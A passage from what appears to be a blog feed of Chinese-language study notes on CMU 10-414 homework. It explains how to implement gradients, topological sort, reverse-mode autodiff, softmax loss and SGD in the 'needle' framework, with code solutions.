class="hljs-number">1</span>])<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(batch_num):<br>        x_d = ndl.<span class="hljs-built_in">Tensor</span>(X[i * batch:(i + <span class="hljs-number">1</span>) * batch])<br>        y_d = ndl.<span class="hljs-built_in">Tensor</span>(Y[i * batch:(i + <span class="hljs-number">1</span>) * batch])<br>        x_w1 = ndl.<span class="hljs-built_in">matmul</span>(x_d, W1)<br>        th_x_w1 = ndl.<span class="hljs-built_in">relu</span>(x_w1)<br>        o = ndl.<span class="hljs-built_in">matmul</span>(th_x_w1, W2)<br>        loss = <span class="hljs-built_in">softmax_loss</span>(o, y_d)<br>        loss.<span class="hljs-built_in">backward</span>()<br>        W1 = ndl.<span class="hljs-built_in">Tensor</span>(W1.<span class="hljs-built_in">realize_cached_data</span>() - lr *<br>                        W1.grad.<span class="hljs-built_in">realize_cached_data</span>())<br>        W2 = ndl.<span class="hljs-built_in">Tensor</span>(W2.<span class="hljs-built_in">realize_cached_data</span>() - lr *<br>                        W2.grad.<span class="hljs-built_in">realize_cached_data</span>())<br>    <span class="hljs-keyword">return</span> W1, W2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习框架</category>
      
      <category>CMU10414</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习框架</tag>
      
      <tag>CMU10414</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmu10414_lab1</title>
    <link href="/2023/10/29/cmu10414-lab1/"/>
    <url>/2023/10/29/cmu10414-lab1/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction-to-needle"><a href="#Introduction-to-needle" class="headerlink" title="Introduction to needle"></a>Introduction to <code>needle</code></h1><p>两个重要的问题</p><ol><li><code>python/needle/autograd.py</code>，定义了框架，包括但不限于以下部分<ol><li>class Op</li><li>class TensorOp(Op)</li><li>class Value</li><li>class Tensor(Value)</li><li>compute_gradient_of_variables</li></ol></li><li><code>python/needle/ops/ops_mathematic.py</code>，包含多种操作的实现</li></ol><p>推荐先熟悉以下类，其他的没那么重要</p><ol><li><p>Value</p></li><li><p>Op</p><p> 关键在于两个函数</p><p> compute()会计算输出</p><p> gradient()会根据输出的梯度，求出输入的梯度（反向传播）</p></li><li><p>Tensor</p></li><li><p>TensorOp</p></li></ol><h1 id="实现forward操作"><a href="#实现forward操作" class="headerlink" title="实现forward操作"></a>实现forward操作</h1><p>很多操作就是一行numpy函数解决，但是最后一个需要自己再处理一下逻辑</p><p>在numpy中，转置维度必须将所有维度包括了，加入维度是5，那么输入的axes的长度一定是五，然后把要交换的两个维度交换位置，比如这里就是将2和4对应的维度交换，[0,1,4,3,2]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute</span><span class="hljs-params">(self, a)</span>:</span><br><span class="hljs-function">    d =</span> a.ndim<br>    axis = [i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(d)]<br>    x, y = (d - <span class="hljs-number">1</span>, d - <span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> self.axes is None        <span class="hljs-built_in">else</span>(self.axes[<span class="hljs-number">0</span>], self.axes[<span class="hljs-number">1</span>])<br>    axis[x], axis[y] = axis[y], axis[x]<br>    <span class="hljs-keyword">return</span> array_api.<span class="hljs-built_in">transpose</span>(a, axes=axis)<br></code></pre></td></tr></table></figure><h1 id="实现backward计算"><a href="#实现backward计算" class="headerlink" title="实现backward计算"></a>实现backward计算</h1><h2 id="power-scalar"><a href="#power-scalar" class="headerlink" title="power_scalar"></a>power_scalar</h2><p>$$<br>y&#x3D;x^a\<br>\frac{dy}{dx}&#x3D;ax^{a-1}<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return out_grad * self.scalar * mul_scalar(node.inputs[<span class="hljs-number">0</span>], self.scalar - <span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h2 id="divide"><a href="#divide" class="headerlink" title="divide"></a>divide</h2><p>$$<br>y&#x3D;\frac{a}{b}\<br>\frac{dy}{da}&#x3D;\frac{1}{b}\<br>\frac{dy}{db}&#x3D;-\frac{a}{b^2}<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    a_d =</span> <span class="hljs-built_in">divide</span>(out_grad, node.inputs[<span class="hljs-number">1</span>])<br>    b_d = <span class="hljs-built_in">negate</span>(<span class="hljs-built_in">multiply</span>(out_grad, <span class="hljs-built_in">divide</span>(<br>        node.inputs[<span class="hljs-number">0</span>], <span class="hljs-built_in">multiply</span>(node.inputs[<span class="hljs-number">1</span>], node.inputs[<span class="hljs-number">1</span>]))))<br>    <span class="hljs-keyword">return</span> a_d, b_d<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h2 id="divide-scalar"><a href="#divide-scalar" class="headerlink" title="divide_scalar"></a>divide_scalar</h2><p>标量操作很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return out_grad / self.scalar</span><br></code></pre></td></tr></table></figure><h2 id="matmul"><a href="#matmul" class="headerlink" title="matmul"></a>matmul</h2><p>这个操作就有点恶心了，特别是两个相乘的矩阵存在高纬（超过两维的情况）</p><p>高维矩阵相乘，本质上是多个二维矩阵相乘，它们除了最后两个维度要能够相乘外，前面的维度必须完全相同，比如一个四维矩阵A[a,b,c,d]和一个三维矩阵[e,f,g]可以相乘的条件就是[c,d]和[f,g]要能够相乘，并且b要等于e</p><p>而求导，也就是将前面维度全部求和，比如C&#x3D;AB，其中A的维度是[a,b,c,d]，B的维度是[d,e]，C的维度就是[a,b,c,e]</p><ol><li>现在损失对A求导的结果的形状肯定也是[a,b,c,d]，这个维度很容易通过C的梯度的形状[a,b,c,e]和B的形状[d,e]凑出来</li><li>而损失函数对B求导的形状肯定是[d,e]，但是这个不能直接由C的梯度[a,b,c,e]和A的梯度[a,b,c,d]凑出来，因为多了前面两维[a,b]，将这两维给除去的方法，就是将对应位置给加起来，通过numpy.sum(0,1)就可以达到这个效果。（为什么相加之后结果就是B的导数，就和矩阵求导相关了，我也不会证明）</li></ol><p>最后，对一个高维矩阵，比如[a,b,c,d]进行转置，好像只会将它转为[a,b,d,c]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    lhs, rhs =</span> node.inputs<br>    lgrad, rgrad = <span class="hljs-built_in">matmul</span>(out_grad, rhs.<span class="hljs-built_in">transpose</span>()), <span class="hljs-built_in">matmul</span>(<br>        lhs.<span class="hljs-built_in">transpose</span>(), out_grad)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lhs.shape) &lt; <span class="hljs-built_in">len</span>(lgrad.shape):<br>        lgrad = lgrad.<span class="hljs-built_in">sum</span>(<br>            <span class="hljs-built_in">tuple</span>([i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lgrad.shape) - <span class="hljs-built_in">len</span>(lhs.shape))]))<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rhs.shape) &lt; <span class="hljs-built_in">len</span>(rgrad.shape):<br>        rgrad = rgrad.<span class="hljs-built_in">sum</span>(<br>            <span class="hljs-built_in">tuple</span>([i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rgrad.shape) - <span class="hljs-built_in">len</span>(rhs.shape))]))<br>    <span class="hljs-keyword">return</span> lgrad, rgrad<br></code></pre></td></tr></table></figure><h2 id="reshape"><a href="#reshape" class="headerlink" title="reshape"></a>reshape</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return reshape(out_grad, node.inputs[<span class="hljs-number">0</span>].shape)</span><br><span class="hljs-function">    # END YOUR SOLUTION</span><br></code></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return negate(out_grad)</span><br></code></pre></td></tr></table></figure><h2 id="transpose"><a href="#transpose" class="headerlink" title="transpose"></a>transpose</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return transpose(out_grad, self.t)</span><br></code></pre></td></tr></table></figure><h2 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h2><ol><li>将变化的维度给找出来，比如原始数据是[3,5,1,4]，被广播成了[3,5,4,4]，那么要做的就是将第3维给找出来，也就是1-&gt;4的这一维，然后将这一维的梯度通过sum相加</li><li>最后还要reshape成原来的样子</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    ori_shape =</span> node.inputs[<span class="hljs-number">0</span>].shape<br>    shrink_dims = [i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.shape))]<br>    <span class="hljs-keyword">for</span> i, (ori, cur) in <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(<span class="hljs-built_in">reversed</span>(ori_shape), <span class="hljs-built_in">reversed</span>(self.shape))):<br>        <span class="hljs-keyword">if</span> ori == cur:<br>            shrink_dims[<span class="hljs-built_in">len</span>(self.shape) - i - <span class="hljs-number">1</span>] = <span class="hljs-number">-1</span><br>    shrink_dims = <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">filter</span>(lambda x: x &gt;= <span class="hljs-number">0</span>, shrink_dims))<br>    <span class="hljs-keyword">return</span> out_grad.<span class="hljs-built_in">sum</span>(shrink_dims).<span class="hljs-built_in">reshape</span>(ori_shape)<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h2 id="summation"><a href="#summation" class="headerlink" title="summation"></a>summation</h2><p>summation是对维度进行了压缩，那么在反向传播时，肯定要将其进行广播</p><p>所以</p><ol><li>先找出哪些维度被压缩了</li><li>reshape成被压缩的形状（之前通过sum操作，可能直接将维度给干没了，所以要reshape恢复维度，即使那个维度的长度是1）</li><li>广播成输入的形状（为啥可以直接广播就是正确的梯度，和矩阵求导相关）</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    new_shape =</span> <span class="hljs-built_in">list</span>(node.inputs[<span class="hljs-number">0</span>].shape)<br>    axes = <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(new_shape)) <span class="hljs-keyword">if</span> self.axes is None <span class="hljs-keyword">else</span> self.axes<br>    <span class="hljs-keyword">for</span> axis in axes:<br>        new_shape[axis] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> out_grad.<span class="hljs-built_in">reshape</span>(new_shape).<span class="hljs-built_in">broadcast_to</span>(node.inputs[<span class="hljs-number">0</span>].shape)<br></code></pre></td></tr></table></figure><h1 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h1><p>这个部分感觉题意有点难理解，本质上很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">find_topo_sort</span><span class="hljs-params">(node_list: List[Value])</span> -&gt; List[Value]:</span><br></code></pre></td></tr></table></figure><p>这个函数给出了一个node_list，这里面可能有多个node，输出以这个node为终点的拓扑排序（正拓扑排序）</p><blockquote><p>以目前我的理解，不太明白为什么是node_list，一般不就是用最后lost的函数的结点为终点找拓扑排序吗。</p><p>我看了一下测试的代码，也都是只用了一个节点，先留个坑</p></blockquote><p>下面这个函数给了一个dfs的模板</p><ol><li>第一个参数node代表当前遍历到了哪个结点</li><li>第二个参数visited代表已经有哪些结点被访问过了</li><li>第三个参数topo_order代表目前已经找到的拓扑排序，我们最后也就是要返回这个作为拓扑排序的答案</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">topo_sort_dfs</span><span class="hljs-params">(node, visited, topo_order)</span>:</span><br></code></pre></td></tr></table></figure><p>实现代码很简单，就是题意对我来说有一点晦涩，感觉和不太熟悉怎么用终点推出拓扑排序有关，菜狗</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">find_topo_sort</span><span class="hljs-params">(node_list: List[Value])</span> -&gt; List[Value]:</span><br><span class="hljs-function">    ans =</span> []<br>    vis = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> node in node_list:<br>        <span class="hljs-built_in">topo_sort_dfs</span>(node, vis, ans)<br>    <span class="hljs-keyword">return</span> ans<br>def <span class="hljs-built_in">topo_sort_dfs</span>(node, visited, topo_order):<br>    <span class="hljs-keyword">if</span> node in visited:<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> ne in node.inputs:<br>        <span class="hljs-built_in">topo_sort_dfs</span>(ne, visited, topo_order)<br>    visited.<span class="hljs-built_in">add</span>(node)<br>    topo_order.<span class="hljs-built_in">append</span>(node)<br></code></pre></td></tr></table></figure><h1 id="反向模式微分"><a href="#反向模式微分" class="headerlink" title="反向模式微分"></a>反向模式微分</h1><p>函数签名</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute_gradient_of_variables</span><span class="hljs-params">(output_tensor, out_grad)</span></span><br></code></pre></td></tr></table></figure><ol><li>第一个参数是最后输出的那个tensor</li><li>第二个参数是这个tensor的梯度</li></ol><p>函数内已有的变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">node_to_output_grads_list: Dict[Tensor, List[Tensor]] = &#123;&#125;<br></code></pre></td></tr></table></figure><p>这个字典表示，当前tensor对应的，所有输出tensor对它的偏导数</p><p>使用起来也很简单，只要将对应的偏导数全部相加，就是当前tensor的梯度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">reverse_topo_order = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">find_topo_sort</span>([output_tensor])))<br></code></pre></td></tr></table></figure><p>这就是反向的拓扑排序</p><p>实现思路基本就是下面这个图</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231024161041846.png" alt="image-20231024161041846"></p><p>但是需要加入一些对当前框架的理解</p><ol><li>首先，这个函数的作用就是计算出每一个tensor对应的梯度，而通过上图也可以看到，我们在反向传播中是通过新建了一个tensor来保存梯度的。按照这个框架的意思，好像是将这个新建的tensor作为原来tensor的一个变量存入原来的tensor，这里可以用self.grad来存。感觉这个参数可以随便命名，可能后面的调用都是自己写</li><li>这里要用到之前写的各种op中的gradient函数了，可以通过<code>gradient_as_tuple</code>来调用。这个函数也正是生成了对输入的所有tensor对应的偏导数tensor，核心操作了属于是</li></ol><p>因此，实现思路</p><ol><li>按照反向拓扑排序的顺序来遍历所有tensor</li><li>根据<code>node_to_output_grads_list</code>对应的值，计算这个tensor的梯度，这里可以用框架提供的<code>sum_node_list</code>来计算梯度之和。然后将计算好的梯度存入当前node</li><li>如果当前tensor没有input结点，也就是op为None，直接continue</li><li>如果当前tensor有input结点<ol><li>先通过<code>gradient_as_tuple</code>取出这个tensor对所有input的偏导数tensor</li><li>然后将input和偏导数tensor一一对应的访问，加入字典<code>node_to_output_grads_list</code>中</li></ol></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute_gradient_of_variables</span><span class="hljs-params">(output_tensor, out_grad)</span>:</span><br><span class="hljs-function">    node_to_output_grads_list: Dict[Tensor, List[Tensor]] =</span> &#123;&#125;<br>    node_to_output_grads_list[output_tensor] = [out_grad]<br>    reverse_topo_order = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">find_topo_sort</span>([output_tensor])))<br>    <span class="hljs-keyword">for</span> node in reverse_topo_order:<br>        grads = <span class="hljs-built_in">sum_node_list</span>(node_to_output_grads_list[node])<br>        node.grad = grads<br>        <span class="hljs-keyword">if</span> node.op is None:<br>            <span class="hljs-keyword">continue</span><br>        node_to_input_grad = node.op.<span class="hljs-built_in">gradient_as_tuple</span>(node.grad, node)<br>        <span class="hljs-keyword">for</span> input_node, input_grad in <span class="hljs-built_in">zip</span>(node.inputs, node_to_input_grad):<br>            <span class="hljs-keyword">if</span> input_node <span class="hljs-keyword">not</span> in node_to_output_grads_list:<br>                node_to_output_grads_list[input_node] = []<br> node_to_output_grads_list[input_node].<span class="hljs-built_in">append</span>(input_grad)<br></code></pre></td></tr></table></figure><h1 id="softmax-loss"><a href="#softmax-loss" class="headerlink" title="softmax loss"></a>softmax loss</h1><p>先实现两个op，要注意，在反向传播的过程中，要全程调用tensor的op，不能再用numpy的操作了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">Log</span><span class="hljs-params">(TensorOp)</span>:</span><br><span class="hljs-function">    def compute(self, a):</span><br><span class="hljs-function">        return array_api.log(a)</span><br><span class="hljs-function">    def gradient(self, out_grad, node):</span><br><span class="hljs-function">        return divide(out_grad, node.inputs[<span class="hljs-number">0</span>])</span><br><span class="hljs-function">class Exp(TensorOp):</span><br><span class="hljs-function">    def compute(self, a):</span><br><span class="hljs-function">        return array_api.exp(a)</span><br><span class="hljs-function">    def gradient(self, out_grad, node):</span><br><span class="hljs-function">        return multiply(out_grad, exp(node.inputs[<span class="hljs-number">0</span>]))</span><br></code></pre></td></tr></table></figure><p>实现softmax，基本就是翻译hw0里的softmax_loss函数，这里用了比较巧的计算方法， 那就是将减号前面和减号后面的分开计算，然后统一相减后求平均值</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231024171353873.png" alt="image-20231024171353873"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">softmax_loss</span><span class="hljs-params">(Z, y_one_hot)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    e_z =</span> ndl.<span class="hljs-built_in">exp</span>(Z)<br>    e_s = ndl.<span class="hljs-built_in">summation</span>(e_z, (<span class="hljs-number">1</span>,))<br>    e_l = ndl.<span class="hljs-built_in">log</span>(e_s)<br>    e_s = ndl.<span class="hljs-built_in">summation</span>(e_l)<br>    <span class="hljs-comment">// 通过矩阵相乘，将one_hot向量变成对应的值</span><br>    y_s = ndl.<span class="hljs-built_in">summation</span>(y_one_hot * Z)<br>    <span class="hljs-built_in">return</span> (e_s - y_s) / Z.shape[<span class="hljs-number">0</span>]<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h1 id="两层神经网络的SGD"><a href="#两层神经网络的SGD" class="headerlink" title="两层神经网络的SGD"></a>两层神经网络的SGD</h1><ol><li>第一步，增加relu函数</li></ol><p>前向计算比较简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute</span><span class="hljs-params">(self, a)</span>:</span><br><span class="hljs-function">    return array_api.maximum(<span class="hljs-number">0</span>, a)</span><br></code></pre></td></tr></table></figure><p>反向传播的时候，原来小于0的部分梯度为0，不用更新，所以只需要更新原来大于0的部分，这部分函数是$relu(x)&#x3D;x$，所以导数还是1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    data =</span> node.<span class="hljs-built_in">realize_cached_data</span>().<span class="hljs-built_in">copy</span>()<br>    data[data &gt; <span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">multiply</span>(out_grad, <span class="hljs-built_in">Tensor</span>(data))<br></code></pre></td></tr></table></figure><ol start="2"><li>第二步，完成sgd</li></ol><p>基本的流程和hw0基本一致，但是有几个注意点</p><ol><li>这里的X和y是numpy类型，使用时要先转为Tensor</li><li>反向传播是从最后一个结点开始的，这里就是loss</li><li>更改参数直接操作W1和W2里面cached_data就可以完成</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">nn_epoch</span><span class="hljs-params">(X, y, W1, W2, lr=<span class="hljs-number">0.1</span>, batch=<span class="hljs-number">100</span>)</span>:    </span><br><span class="hljs-function">batch_num =</span> X.shape[<span class="hljs-number">0</span>] <span class="hljs-comment">// batch</span><br>    Y = <span class="hljs-built_in">gethot</span>(y, W2.shape[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(batch_num):<br>        x_d = ndl.<span class="hljs-built_in">Tensor</span>(X[i * batch:(i + <span class="hljs-number">1</span>) * batch])<br>        y_d = ndl.<span class="hljs-built_in">Tensor</span>(Y[i * batch:(i + <span class="hljs-number">1</span>) * batch])<br>        x_w1 = ndl.<span class="hljs-built_in">matmul</span>(x_d, W1)<br>        th_x_w1 = ndl.<span class="hljs-built_in">relu</span>(x_w1)<br>        o = ndl.<span class="hljs-built_in">matmul</span>(th_x_w1, W2)<br>        loss = <span class="hljs-built_in">softmax_loss</span>(o, y_d)<br>        loss.<span class="hljs-built_in">backward</span>()<br>        W1 = ndl.<span class="hljs-built_in">Tensor</span>(W1.<span class="hljs-built_in">realize_cached_data</span>() - lr *<br>                        W1.grad.<span class="hljs-built_in">realize_cached_data</span>())<br>        W2 = ndl.<span class="hljs-built_in">Tensor</span>(W2.<span class="hljs-built_in">realize_cached_data</span>() - lr *<br>                        W2.grad.<span class="hljs-built_in">realize_cached_data</span>())<br>    <span class="hljs-keyword">return</span> W1, W2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习框架</category>
      
      <category>CMU10414</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习框架</tag>
      
      <tag>CMU10414</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmu10414_lab0</title>
    <link href="/2023/10/25/cmu10414-lab0/"/>
    <url>/2023/10/25/cmu10414-lab0/</url>
    
    <content type="html"><![CDATA[<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>-m 指定测试的程序为pytest</p><p>-k 指定名字中包含add的测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">!python3 -m pytest -k <span class="hljs-string">&quot;add&quot;</span><br></code></pre></td></tr></table></figure><p>-s 可以让print正常打印</p><p>通过下面指令可以方便地让jupyter编程Markdown</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">jupyter nbconvert --to markdown faker.ipynb<br></code></pre></td></tr></table></figure><h1 id="parse-mnist"><a href="#parse-mnist" class="headerlink" title="parse_mnist"></a>parse_mnist</h1><p>函数的两个参数已经包含了文件夹，因此可以直接作为路径进行open</p><p>整体思路</p><ol><li>解压文件</li><li>通过numpy从文件中读数据</li><li>修改数据的格式和类型</li><li>归一化</li></ol><p>具体操作</p><ol><li><p>首先要用gzip将gz文件解压缩</p><p> <code>rb</code>的意思是只读字节流的形式打开。对图像，音频等数据，用这种方式打开最合适</p></li><li><p><code>data = np.frombuffer(f.read(), dtype=np.uint8, offset=16)</code></p><ol><li>dtype&#x3D;uint8就够了，因为图像的每个像素值都是0-255，指定这个类型之后，会将f文件的每个字节都翻译成一个uint8类型的变量</li><li>offset&#x3D;16是这个数据集特有的特点，即前16个元数据的字节直接跳过即可，这个值应该是每个数据集都可能不一样</li></ol></li><li><p>将data的形状修改并修改数据类型，刚读入的形状是一个一维数组</p></li><li><p>归一化操作很简单，将0-255映射到0-1即可</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_mnist</span>(<span class="hljs-params">image_filename, label_filename</span>):<br>    <span class="hljs-comment"># 读取数据</span><br>    <span class="hljs-keyword">with</span> gzip.<span class="hljs-built_in">open</span>(image_filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span 